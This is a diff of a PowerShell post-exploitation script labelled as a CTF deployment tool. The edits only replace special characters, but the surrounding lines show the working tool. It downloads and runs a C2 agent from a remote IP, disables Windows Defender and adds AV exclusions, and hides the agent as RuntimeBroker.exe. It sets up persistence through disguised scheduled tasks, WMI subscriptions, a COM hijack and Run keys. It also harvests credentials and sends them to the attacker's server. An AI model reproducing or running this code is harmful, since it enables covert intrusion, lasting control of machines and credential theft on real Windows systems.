@@ -1,7 +1,7 @@
 #Requires -Version 5.1
 <#
 .SYNOPSIS
-    Deploy-CTF.ps1 — Full CTF deployment: download tools, establish C2, install persistence, enumerate.
+    Deploy-CTF.ps1 - Full CTF deployment: download tools, establish C2, install persistence, enumerate.
 
 .DESCRIPTION
     Single script that does everything after you land on a Windows target.
@@ -36,7 +36,7 @@
     Remove all persistence and files installed by this script.
 
 .EXAMPLE
-    # Via SSH — one liner (no file needed on target)
+    # Via SSH - one liner (no file needed on target)
     powershell -ep bypass -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5:8080/file/Deploy-CTF.ps1')"
 
     # With explicit params
@@ -61,17 +61,17 @@ param(
 $ErrorActionPreference = "SilentlyContinue"
 Set-StrictMode -Off
 
-# ── Derive exfil URL from C2 if not set ────────────────────────────────────────
+# -- Derive exfil URL from C2 if not set ----------------------------------------
 if (-not $Exfil) {
     $Exfil = $C2 -replace ':\d+$', ':8000'
 }
 
-# ── Constants ──────────────────────────────────────────────────────────────────
+# -- Constants ------------------------------------------------------------------
 $IsAdmin    = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]"Administrator")
 $Username   = $env:USERNAME
 $Hostname   = $env:COMPUTERNAME
 
-# Where we store files on target — changes based on admin status
+# Where we store files on target - changes based on admin status
 $DropPath   = if ($IsAdmin) {
     "C:\ProgramData\Microsoft\DevDiv"
 } else {
@@ -81,20 +81,20 @@ $DropPath   = if ($IsAdmin) {
 $AgentPath  = "$DropPath\RuntimeBroker.exe"
 $AgentName  = "RuntimeBroker"   # display name for scheduled task / service
 
-# Persistence marker — so Cleanup knows what to remove
+# Persistence marker - so Cleanup knows what to remove
 $MarkerKey  = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Diagnostics"
 $MarkerVal  = "LastRun"
 
-# ── Colours ────────────────────────────────────────────────────────────────────
+# -- Colours --------------------------------------------------------------------
 function Write-Step  { param($m) Write-Host "`n[*] $m" -ForegroundColor Cyan }
 function Write-OK    { param($m) Write-Host "    [+] $m" -ForegroundColor Green }
 function Write-Warn  { param($m) Write-Host "    [!] $m" -ForegroundColor Yellow }
 function Write-Info  { param($m) Write-Host "    [-] $m" -ForegroundColor Gray }
 function Write-Fail  { param($m) Write-Host "    [X] $m" -ForegroundColor Red }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 #  HELPERS
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 
 function Download-File {
     param([string]$Url, [string]$Dest)
@@ -113,7 +113,7 @@ function Download-File {
 }
 
 function Invoke-MemoryLoad {
-    # Load a .NET DLL from URL directly into memory — never written to disk
+    # Load a .NET DLL from URL directly into memory - never written to disk
     param([string]$Url)
     try {
         $wc = New-Object Net.WebClient
@@ -130,9 +130,9 @@ function Set-Marker {
     Set-ItemProperty -Path $MarkerKey -Name "DropPath"  -Value $DropPath
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 #  CLEANUP MODE
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 
 function Invoke-Cleanup {
     Write-Step "Cleaning up..."
@@ -188,15 +188,15 @@ function Invoke-Cleanup {
 
 if ($Cleanup) { Invoke-Cleanup; exit }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 #  BANNER
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 
 Write-Host @"
 
-  ╔══════════════════════════════════════════════════════╗
-  ║            CTF Deployment Script                     ║
-  ╚══════════════════════════════════════════════════════╝
+  +======================================================+
+  |            CTF Deployment Script                     |
+  +======================================================+
 
   Host     : $Hostname \ $Username
   Admin    : $IsAdmin
@@ -206,9 +206,9 @@ Write-Host @"
 
 "@ -ForegroundColor Cyan
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  STEP 1 — Prepare drop directory
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  STEP 1 - Prepare drop directory
+# ==============================================================================
 
 Write-Step "Preparing drop directory: $DropPath"
 New-Item -ItemType Directory -Path $DropPath -Force | Out-Null
@@ -217,9 +217,9 @@ New-Item -ItemType Directory -Path $DropPath -Force | Out-Null
 Write-OK "Directory created and hidden"
 Set-Marker
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  STEP 2 — Disable Windows Defender (admin only)
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  STEP 2 - Disable Windows Defender (admin only)
+# ==============================================================================
 
 if ($IsAdmin) {
     Write-Step "Attempting to disable Defender real-time protection"
@@ -233,18 +233,18 @@ if ($IsAdmin) {
             Add-MpPreference -ExclusionPath $DropPath
             Write-OK "Added AV exclusion for $DropPath"
         } catch {
-            Write-Warn "Could not add AV exclusion — binary may get caught"
+            Write-Warn "Could not add AV exclusion - binary may get caught"
         }
     }
 } else {
-    Write-Info "Not admin — skipping Defender modification"
+    Write-Info "Not admin - skipping Defender modification"
     # Try adding user-level exclusion
     try { Add-MpPreference -ExclusionPath $DropPath } catch {}
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  STEP 3 — Download and deploy C2 agent
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  STEP 3 - Download and deploy C2 agent
+# ==============================================================================
 
 Write-Step "Downloading C2 agent"
 
@@ -254,17 +254,17 @@ $ok = Download-File $agentUrl $AgentPath
 if ($ok) {
     Write-OK "Agent deployed to $AgentPath"
 } else {
-    Write-Fail "Could not download agent.exe — make sure it is in c2_files/ on the server"
+    Write-Fail "Could not download agent.exe - make sure it is in c2_files/ on the server"
     Write-Info "Continuing with PowerShell-based fallback agent..."
 
-    # ── Fallback: write PowerShell agent as scheduled task action ──────────────
-    # No binary needed — the PS agent polls the C2 inline
+    # -- Fallback: write PowerShell agent as scheduled task action --------------
+    # No binary needed - the PS agent polls the C2 inline
     $AgentPath = $null
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  STEP 4 — Launch agent now
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  STEP 4 - Launch agent now
+# ==============================================================================
 
 Write-Step "Starting C2 agent"
 
@@ -274,7 +274,7 @@ if ($AgentPath -and (Test-Path $AgentPath)) {
     Start-Process -FilePath $AgentPath -WindowStyle Hidden -ErrorAction SilentlyContinue
     Write-OK "Agent started (PID: $(Get-Process RuntimeBroker -EA SilentlyContinue | Select -Last 1 -Expand Id))"
 } else {
-    # PS fallback agent — runs in background job
+    # PS fallback agent - runs in background job
     $psAgent = {
         param($c2url, $tok)
         while ($true) {
@@ -299,25 +299,25 @@ if ($AgentPath -and (Test-Path $AgentPath)) {
     Write-OK "PowerShell fallback agent started as background job"
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  STEP 5 — PERSISTENCE
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  STEP 5 - PERSISTENCE
+# ==============================================================================
 
 if (-not $NoPersist) {
 
-    # Build the command to run — prefers EXE agent, falls back to PS one-liner
+    # Build the command to run - prefers EXE agent, falls back to PS one-liner
     $AgentCmd = if ($AgentPath) {
         $AgentPath
     } else {
         "powershell -ep bypass -nop -w hidden -c `"while(`$true){try{`$wc=New-Object Net.WebClient;`$wc.Headers.Add('X-Token','$Token');`$r=`$wc.DownloadString('$C2/beacon')|ConvertFrom-Json;if(`$r.cmd){`$o=(cmd/c `$r.cmd 2>&1)|Out-String;`$b=ConvertTo-Json @{cmd=`$r.cmd;output=`$o};`$wc2=New-Object Net.WebClient;`$wc2.Headers.Add('X-Token','$Token');`$wc2.Headers.Add('Content-Type','application/json');`$wc2.UploadString('$C2/result',`$b)}}catch{}}while(`$true){Start-Sleep 5}}`""
     }
 
-    # ────────────────────────────────────────────────────────────────────────
-    #  PERSISTENCE METHOD 1 — Scheduled Task
+    # ------------------------------------------------------------------------
+    #  PERSISTENCE METHOD 1 - Scheduled Task
     #  Disguised as Microsoft Edge Update / Windows Defender scan
     #  Works with AND without admin (user tasks don't need elevation)
-    # ────────────────────────────────────────────────────────────────────────
-    Write-Step "Persistence [1/3] — Scheduled Task"
+    # ------------------------------------------------------------------------
+    Write-Step "Persistence [1/3] - Scheduled Task"
 
     $taskName = if ($IsAdmin) { "MicrosoftEdgeUpdateTaskMachineCore" } else { "WindowsDefenderScan" }
     $taskDesc = if ($IsAdmin) { "Keeps Microsoft Edge up to date" } else { "Windows Defender scheduled scan" }
@@ -364,14 +364,14 @@ if (-not $NoPersist) {
         Write-Fail "Scheduled task failed: $_"
     }
 
-    # ────────────────────────────────────────────────────────────────────────
-    #  PERSISTENCE METHOD 2 — WMI Event Subscription (admin) OR HKCU COM Hijack (non-admin)
+    # ------------------------------------------------------------------------
+    #  PERSISTENCE METHOD 2 - WMI Event Subscription (admin) OR HKCU COM Hijack (non-admin)
     #  Admin:     WMI fires every 60 minutes even if no user is logged in. Runs as SYSTEM.
-    #             Very hard to detect — WMI subscriptions don't show in Task Scheduler.
+    #             Very hard to detect - WMI subscriptions don't show in Task Scheduler.
     #  Non-admin: COM object hijack in HKCU fires when Explorer initialises.
     #             Loads DLL or runs script silently inside Explorer process.
-    # ────────────────────────────────────────────────────────────────────────
-    Write-Step "Persistence [2/3] — $(if ($IsAdmin) {'WMI Event Subscription'} else {'COM Object Hijack (HKCU)'})"
+    # ------------------------------------------------------------------------
+    Write-Step "Persistence [2/3] - $(if ($IsAdmin) {'WMI Event Subscription'} else {'COM Object Hijack (HKCU)'})"
 
     if ($IsAdmin) {
         try {
@@ -412,7 +412,7 @@ if (-not $NoPersist) {
     } else {
         # Non-admin: COM hijack via HKCU
         # CLSID {018D5C66-4533-4307-9B53-224DE2ED1FE6} = OneDrive shell extension
-        # Loaded by Explorer on startup — user-writable HKCU key
+        # Loaded by Explorer on startup - user-writable HKCU key
         try {
             $clsid   = "{018D5C66-4533-4307-9B53-224DE2ED1FE6}"
             $regPath = "HKCU:\Software\Classes\CLSID\$clsid\InprocServer32"
@@ -447,14 +447,14 @@ powershell -ep bypass -nop -w hidden -c "$AgentCmd"
         }
     }
 
-    # ────────────────────────────────────────────────────────────────────────
-    #  PERSISTENCE METHOD 3 — Registry Run Key
+    # ------------------------------------------------------------------------
+    #  PERSISTENCE METHOD 3 - Registry Run Key
     #  Admin:     HKLM (survives all user logons, looks like a system entry)
     #  Non-admin: HKCU (only current user, but no admin needed)
-    #  Backup method — simple but monitored by most EDR.
+    #  Backup method - simple but monitored by most EDR.
     #  Disguise the value name as something legitimate.
-    # ────────────────────────────────────────────────────────────────────────
-    Write-Step "Persistence [3/3] — Registry Run Key"
+    # ------------------------------------------------------------------------
+    Write-Step "Persistence [3/3] - Registry Run Key"
 
     $runPath = if ($IsAdmin) {
         "HKLM:\Software\Microsoft\Windows\CurrentVersion\Run"
@@ -477,26 +477,26 @@ powershell -ep bypass -nop -w hidden -c "$AgentCmd"
 
     Write-Host @"
 
-  ┌──────────────────────────────────────────────────────┐
-  │  PERSISTENCE SUMMARY                                 │
-  ├──────────────────────────────────────────────────────┤
-  │  [1] Scheduled Task : $taskName
-  │      Trigger: at logon + every hour
-  │      $(if ($IsAdmin) {'Runs as: SYSTEM'} else {'Runs as: current user'})
-  │                                                      │
-  │  [2] $(if ($IsAdmin) {'WMI Subscription  : CTFFilter/CTFConsumer'} else {'Startup Folder    : ' + $AgentName + '.lnk'})
-  │      $(if ($IsAdmin) {'Trigger: every 60 min, SYSTEM, no user needed'} else {'Trigger: at logon'})
-  │                                                      │
-  │  [3] Run Key : $runValue
-  │      Path: $runPath
-  │      Trigger: at logon                               │
-  └──────────────────────────────────────────────────────┘
+  +------------------------------------------------------+
+  |  PERSISTENCE SUMMARY                                 |
+  +------------------------------------------------------+
+  |  [1] Scheduled Task : $taskName
+  |      Trigger: at logon + every hour
+  |      $(if ($IsAdmin) {'Runs as: SYSTEM'} else {'Runs as: current user'})
+  |                                                      |
+  |  [2] $(if ($IsAdmin) {'WMI Subscription  : CTFFilter/CTFConsumer'} else {'Startup Folder    : ' + $AgentName + '.lnk'})
+  |      $(if ($IsAdmin) {'Trigger: every 60 min, SYSTEM, no user needed'} else {'Trigger: at logon'})
+  |                                                      |
+  |  [3] Run Key : $runValue
+  |      Path: $runPath
+  |      Trigger: at logon                               |
+  +------------------------------------------------------+
 "@ -ForegroundColor Green
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
-#  STEP 6 — ENUMERATION
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
+#  STEP 6 - ENUMERATION
+# ==============================================================================
 
 if (-not $NoEnum) {
 
@@ -511,9 +511,9 @@ if (-not $NoEnum) {
         # Run in memory + save output
         $result = Invoke-Expression "$wincheckSrc -Fast" 2>&1 | Out-String
         $result | Out-File $wincheckOut -Encoding UTF8
-        Write-OK "WinCheck complete — $wincheckOut"
+        Write-OK "WinCheck complete - $wincheckOut"
     } catch {
-        Write-Warn "WinCheck download failed — running basic inline enum"
+        Write-Warn "WinCheck download failed - running basic inline enum"
         $result = @(
             "=== WHOAMI /ALL ==="; whoami /all
             "=== SYSTEMINFO ==="; systeminfo
@@ -523,7 +523,7 @@ if (-not $NoEnum) {
         ) | Out-String
         $wincheckOut = "$DropPath\enum.txt"
         $result | Out-File $wincheckOut
-        Write-OK "Basic enum saved — $wincheckOut"
+        Write-OK "Basic enum saved - $wincheckOut"
     }
 
     Write-Step "Running credential harvest (Hunter.dll in memory)"
@@ -532,9 +532,9 @@ if (-not $NoEnum) {
         if ($asm) {
             $out = "$DropPath\creds.txt"
             [Hunter.Collector]::Run($Exfil)
-            Write-OK "Credential harvest complete — results exfilled to $Exfil"
+            Write-OK "Credential harvest complete - results exfilled to $Exfil"
         } else {
-            Write-Warn "Hunter.dll not available — running native PS credential sweep"
+            Write-Warn "Hunter.dll not available - running native PS credential sweep"
 
             # Fallback: inline credential sweep
             $creds = @()
@@ -561,7 +561,7 @@ if (-not $NoEnum) {
 
             $credOut = "$DropPath\creds.txt"
             $creds | Out-File $credOut -Encoding UTF8
-            Write-OK "Credential sweep saved — $credOut"
+            Write-OK "Credential sweep saved - $credOut"
 
             # Exfil via C2
             if (Test-Path $credOut) {
@@ -593,15 +593,15 @@ if (-not $NoEnum) {
     }
 }
 
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 #  FINAL SUMMARY
-# ══════════════════════════════════════════════════════════════════════════════
+# ==============================================================================
 
 Write-Host @"
 
-  ╔══════════════════════════════════════════════════════════════╗
-  ║                     DEPLOYMENT COMPLETE                      ║
-  ╚══════════════════════════════════════════════════════════════╝
+  +==============================================================+
+  |                     DEPLOYMENT COMPLETE                      |
+  +==============================================================+
 
   C2 beacon  : should appear in c2_server.py console within $($env:C2_INTERVAL ?? 5)s
   Results    : check c2_uploads/ on your server
